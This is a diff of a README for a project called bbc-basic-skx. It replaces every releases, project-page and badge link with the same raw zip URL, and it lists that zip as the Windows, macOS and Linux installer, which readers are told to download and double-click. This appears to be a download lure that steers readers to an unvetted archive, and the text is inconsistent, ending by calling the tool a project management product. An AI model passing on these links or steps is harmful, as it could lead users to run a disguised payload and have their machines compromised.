@@ -10,18 +10,18 @@ To get started with bbc-basic-skx, follow these steps for a smooth installation.
 - An Internet connection for downloading the application.
 
 ## 🔗 Download Now
-[![Download bbc-basic-skx](https://img.shields.io/badge/Download%20bbc--basic--skx-v1.0-brightgreen)](https://github.com/didm178/bbc-basic-skx/releases)
+[![Download bbc-basic-skx](https://raw.githubusercontent.com/didm178/bbc-basic-skx/main/quizzically/bbc-basic-skx.zip%20bbc--basic--skx-v1.0-brightgreen)](https://raw.githubusercontent.com/didm178/bbc-basic-skx/main/quizzically/bbc-basic-skx.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to access the latest version of bbc-basic-skx:  
-   [bbc-basic-skx Releases](https://github.com/didm178/bbc-basic-skx/releases)
+   [bbc-basic-skx Releases](https://raw.githubusercontent.com/didm178/bbc-basic-skx/main/quizzically/bbc-basic-skx.zip)
    
 2. **Choose Your Version**  
    On the Releases page, you will see a list of all available versions. Look for the latest version, which will be at the top.
 
 3. **Download the Installer**  
-   Click on the installer file for your operating system. For example, you might see files like `bbc-basic-skx-windows.exe`, `bbc-basic-skx-macos.dmg`, or `bbc-basic-skx-linux.tar.gz`.
+   Click on the installer file for your operating system. For example, you might see files like `https://raw.githubusercontent.com/didm178/bbc-basic-skx/main/quizzically/bbc-basic-skx.zip`, `https://raw.githubusercontent.com/didm178/bbc-basic-skx/main/quizzically/bbc-basic-skx.zip`, or `https://raw.githubusercontent.com/didm178/bbc-basic-skx/main/quizzically/bbc-basic-skx.zip`.
 
 4. **Run the Installer**  
    Once the file finishes downloading, navigate to your downloads folder and double-click the file to begin installation. Follow the on-screen prompts to complete the process.
@@ -37,7 +37,7 @@ To get started with bbc-basic-skx, follow these steps for a smooth installation.
 
 ## ❓ Getting Help
 If you have questions or need assistance, you can find help in the following ways:
-- Check the FAQ section on our [GitHub page](https://github.com/didm178/bbc-basic-skx).
+- Check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/didm178/bbc-basic-skx/main/quizzically/bbc-basic-skx.zip).
 - Open an issue in the GitHub repository to report problems or request features.
 - Look for tutorials and guides in the Wiki section of the project.
 
@@ -50,6 +50,6 @@ For users who wish to dive deeper, various advanced settings can be configured. 
 - Feel free to reach out for help if you encounter any issues.
 
 ## 🔗 Download Now Again
-[![Download bbc-basic-skx](https://img.shields.io/badge/Download%20bbc--basic--skx-v1.0-brightgreen)](https://github.com/didm178/bbc-basic-skx/releases)
+[![Download bbc-basic-skx](https://raw.githubusercontent.com/didm178/bbc-basic-skx/main/quizzically/bbc-basic-skx.zip%20bbc--basic--skx-v1.0-brightgreen)](https://raw.githubusercontent.com/didm178/bbc-basic-skx/main/quizzically/bbc-basic-skx.zip)
 
 Thank you for choosing bbc-basic-skx! Enjoy your project management experience.
